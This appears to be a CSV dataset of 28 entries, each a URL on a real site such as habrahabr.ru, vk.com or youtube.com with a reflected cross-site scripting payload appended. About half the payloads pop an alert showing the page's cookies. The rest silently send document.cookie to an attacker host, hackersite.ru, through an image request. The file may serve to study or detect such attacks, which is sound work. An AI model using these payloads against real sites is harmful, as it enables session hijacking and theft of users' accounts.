,language,source
0,JS,"https://vk.com/im?q=»><script>alert(«cookie: «+document.cookie)</script>"
1,JS,"https://weekend.rambler.ru/crazy-world/»><script>alert(«cookie: «+document.cookie)</script>"
2,JS,"https://zen.yandex.ru/media/gamehata/luchshie-igry-pohojie-na-dark-souls-na-pk-5ac7aea2db0cd9b106502d56»><script>alert(«cookie: «+document.cookie)</script>"
3,JS,"https://pics.ru/lyudi-izmenilis-za-shest-let?utm_referrer=https%3A%2F%2Fzen.yandex.com»><script>alert(«cookie: «+document.cookie)</script>"
4,JS,"https://habrahabr.ru/»><script>alert(«cookie: «+document.cookie)</script>"
5,JS,"https://habrahabr.ru/company/zfort/blog/354064/»><script>alert(«cookie: «+document.cookie)</script>"
6,JS,"https://habrahabr.ru/company/croccloudteam/blog/353666/»><script>alert(«cookie: «+document.cookie)</script>"
7,JS,"https://habrahabr.ru/company/toster/blog/354082/»><script>alert(«cookie: «+document.cookie)</script>"
8,JS,"https://habrahabr.ru/post/354044/»><script>alert(«cookie: «+document.cookie)</script>"
9,JS,"https://habrahabr.ru/post/354080/»><script>alert(«cookie: «+document.cookie)</script>"
10,JS,"https://habrahabr.ru/post/66057/="><script>var img=new Image();img.src="http://hackersite.ru/xss.jpg?"+ encodeURI(document.cookie);</script>"
11,JS,"https://www.youtube.com/watch?v=ZnU5Cu_GR1o"><script>var img=new Image();img.src="http://hackersite.ru/xss.jpg?"+ encodeURI(document.cookie);</script>"
12,JS,"https://habrahabr.ru/company/zfort/blog/354060/"><script>var img=new Image();img.src="http://hackersite.ru/xss.jpg?"+ encodeURI(document.cookie);</script>"
13,JS,"https://habrahabr.ru/company/1cloud/blog/353966/"><script>var img=new Image();img.src="http://hackersite.ru/xss.jpg?"+ encodeURI(document.cookie);</script>"
14,JS,"https://habrahabr.ru/company/yandex/blog/352098/"><script>var img=new Image();img.src="http://hackersite.ru/xss.jpg?"+ encodeURI(document.cookie);</script>"
15,JS,"https://habrahabr.ru/company/mailru/blog/353932/"><script>var img=new Image();img.src="http://hackersite.ru/xss.jpg?"+ encodeURI(document.cookie);</script>"
16,JS,"https://habrahabr.ru/company/zfort/blog/354064/"><script>var img=new Image();img.src="http://hackersite.ru/xss.jpg?"+ encodeURI(document.cookie);</script>"
17,JS,"https://habrahabr.ru/post/353994/"><script>var img=new Image();img.src="http://hackersite.ru/xss.jpg?"+ encodeURI(document.cookie);</script>"
18,JS,"https://habrahabr.ru/company/pvs-studio/blog/354120/"><script>var img=new Image();img.src="http://hackersite.ru/xss.jpg?"+ encodeURI(document.cookie);</script>"
19,JS,"https://habrahabr.ru/post/66057/="><script>var img=new Image();img.src="http://hackersite.ru/xss.jpg?"+ encodeURI(document.cookie);</script>"
20,JS,"https://habrahabr.ru/company/zfort/blog/354064/»><script>alert(«cookie: «+document.cookie)</script>"
21,JS,"https://habrahabr.ru/company/croccloudteam/blog/353666/»><script>alert(«cookie: «+document.cookie)</script>"
22,JS,"https://habrahabr.ru/company/toster/blog/354082/»><script>alert(«cookie: «+document.cookie)</script>"
23,JS,"https://habrahabr.ru/company/pvs-studio/blog/354120/»><script>alert(«cookie: «+document.cookie)</script>"
24,JS,"https://habrahabr.ru/post/354080/»><script>alert(«cookie: «+document.cookie)</script>"
25,JS,"https://habrahabr.ru/company/yandex/blog/352098/"><script>var img=new Image();img.src="http://hackersite.ru/xss.jpg?"+ encodeURI(document.cookie);</script>"
26,JS,"https://habrahabr.ru/company/pvs-studio/blog/354120/"><script>var img=new Image();img.src="http://hackersite.ru/xss.jpg?"+ encodeURI(document.cookie);</script>"
27,JS,"https://habrahabr.ru/company/zfort/blog/354064/"><script>var img=new Image();img.src="http://hackersite.ru/xss.jpg?"+ encodeURI(document.cookie);</script>"
